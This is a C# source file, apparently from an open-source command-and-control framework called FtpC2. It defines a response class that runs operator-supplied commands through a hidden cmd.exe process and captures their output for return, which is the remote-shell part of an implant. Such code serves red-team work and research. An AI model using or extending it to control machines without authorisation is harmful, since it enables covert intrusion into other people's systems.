/*
 * =========================================================================================
 * Author:        Jean-Pierre LESUEUR (@DarkCoderSc)
 * Email:         jplesueur@phrozen.io
 * Website:       https://www.phrozen.io
 * GitHub:        https://github.com/DarkCoderSc
 * Twitter:       https://twitter.com/DarkCoderSc
 * License:       Apache-2.0
 * =========================================================================================
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace FtpC2.Responses
{
    public class ResponseShellCommand : ResponseWrapper
    {
        public string? Command { get; set; }
        public byte[]? Stdout { get; set; }
        public byte[]? Stderr { get; set; }

        public override string DisplayName()
        {
            return this.Command ?? "NULL";
        }
        
        public void RunShellCommand(string commandLine)
        {
            using Process process = new()
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe", // sh / bash etc.. (TODO: Dynamic)
                    Arguments = "/c " + commandLine,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                }
            };
            
            this.Command = commandLine;

            process.Start();

            Task<string> stdOutputTask = process.StandardOutput.ReadToEndAsync();
            Task<string> stdErrorTask = process.StandardError.ReadToEndAsync();

            if (process.WaitForExit(60 * 1000 * 10)) // 10 min threshold
            {
                this.Stdout = Encoding.UTF8.GetBytes(stdOutputTask.Result);
                this.Stderr = Encoding.UTF8.GetBytes(stdErrorTask.Result);
            }
            else
                process.Kill();
            
        }
    }
}
